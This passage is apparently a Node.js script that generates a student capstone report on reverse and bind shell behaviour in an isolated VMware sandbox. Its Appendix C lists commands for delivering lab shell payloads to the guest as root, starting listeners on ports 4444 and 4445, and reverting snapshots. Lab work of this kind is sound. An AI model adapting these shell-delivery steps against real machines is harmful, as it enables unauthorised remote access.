    ["listeners/c2_listener.py, listeners/bind_connect.py", "Analyst-side listener and client used to drive/log sessions"],
  ],
  [45, 55]
));

// Appendix C
bodyChildren.push(h1("Appendix C: Key Commands"));
bodyChildren.push(...mono([
  "# Snapshot (VM powered off, before the experiment)",
  "vmrun -T ws snapshot malware-sandbox-lab.vmx 01-CLEAN-BASELINE",
  "",
  "# Deliver payloads from the analyst host",
  "scp -i build/lab_key payloads/lab_*.sh root@192.168.116.200:/root/",
  "",
  "# Reverse shell: host listener, then launch in guest",
  "python listeners/c2_listener.py evidence/reverse_session.log",
  "ssh root@192.168.116.200 'setsid bash /root/lab_reverse.sh & sleep 2; ps auxww | grep lab_reverse'",
  "",
  "# Bind shell: launch in guest, then connect from host",
  "ssh root@192.168.116.200 'setsid bash /root/lab_bind.sh & sleep 3; ss -tulpn | grep 4445'",
  "python listeners/bind_connect.py 192.168.116.200 evidence/bind_session.log",
  "",
  "# Live observation (run during both sessions)",
  "ps auxww | grep -E 'lab_reverse|/bin/sh -i|python3' ; ss -tupn | grep -E ':4444|:4445'",
  "",
  "# Restore and verify",
  "ssh root@192.168.116.200 'systemctl poweroff'",
  "vmrun -T ws revertToSnapshot malware-sandbox-lab.vmx 01-CLEAN-BASELINE",
  "vmrun -T ws start malware-sandbox-lab.vmx nogui",
]));

// ── Assemble document ─────────────────────────────────────────────────
const pageFooter = new Footer({
  children: [new Paragraph({
    alignment: AlignmentType.CENTER,
    children: [new TextRun({ children: [PageNumber.CURRENT], size: 18, color: "808080", font: EN })],
  })],
});
const pageHeader = new Header({
  children: [new Paragraph({
    alignment: AlignmentType.CENTER, spacing: { after: 0 },
    children: [new TextRun({ text: "Malware Analysis Sandbox Lab - Capstone Report", size: 18, color: "808080", font: EN })],
  })],
});

const doc = new Document({
  creator: "Shubham Shinde (PRN 2125UCSM1042)",
  title: "Malware Analysis Sandbox Lab - Capstone Report",
  styles: {
    default: {
      document: {
        run: { font: EN, size: 24, color: P.body },
        paragraph: { spacing: { line: 312 } },
      },
      heading1: {
        run: { font: EN, size: 32, bold: true, color: P.headings },
        paragraph: { spacing: { before: 360, after: 160, line: 312 } },
      },
      heading2: {
        run: { font: EN, size: 28, bold: true, color: P.headings },
        paragraph: { spacing: { before: 260, after: 120, line: 312 } },
      },
    },
  },
  sections: [
    {
      properties: { page: { size: { width: 11906, height: 16838 }, margin: { top: 0, bottom: 0, left: 0, right: 0 } } },
      children: buildCoverR1({
        title: "Malware Analysis Sandbox Lab",
        subtitle: "Reverse & Bind Shell Behaviour in an Isolated Virtual Machine",
        englishLabel: "CAPSTONE PROJECT REPORT",
        metaLines: [
          "Submitted by: Shubham Shinde",
          "PRN: 2125UCSM1042",
          "Hypervisor: VMware Workstation 26.0 (host-only networking)",
          "Guest OS: Debian 13.7 'trixie' - kernel 6.12.107-1",
          "Snapshot: 01-CLEAN-BASELINE (revert verified)",
          "Compiled: October 2026",
        ],
        footerLeft: "Network Protection & Cyber Security - Capstone",
        footerRight: "Sandbox Lab Series",
        palette: P,
      }),
    },
    {
      properties: {
        type: SectionType.NEXT_PAGE,
        page: { size: { width: 11906, height: 16838 }, margin: { top: 1440, bottom: 1440, left: 1701, right: 1417 } },
      },
      children: [
        new Paragraph({
          alignment: AlignmentType.CENTER, spacing: { before: 200, after: 240 },
          children: [new TextRun({ text: "Table of Contents", bold: true, size: 32, color: P.headings, font: EN })],
        }),
        new TableOfContents("Table of Contents", { hyperlink: true, headingStyleRange: "1-2" }),
        new Paragraph({
          spacing: { before: 200 },
          children: [new TextRun({ text: "Note: right-click the table of contents and choose 'Update Field' to refresh page numbers.", italics: true, size: 18, color: "909090", font: EN })],
        }),
      ],
    },
    {
      properties: {
        type: SectionType.NEXT_PAGE,
        page: {
          size: { width: 11906, height: 16838 },
          margin: { top: 1440, bottom: 1440, left: 1701, right: 1417 },
          pageNumbers: { start: 1, formatType: NumberFormat.DECIMAL },
        },
      },
      headers: { default: pageHeader },
      footers: { default: pageFooter },
      children: bodyChildren,
    },
  ],
});

Packer.toBuffer(doc).then((buf) => {
  const out = path.resolve(__dirname, "..", "Malware-Analysis-Sandbox-Lab-Report-Shubham-Shinde-2125UCSM1042.docx");
  fs.writeFileSync(out, buf);
  console.log("written:", out, buf.length, "bytes");
});
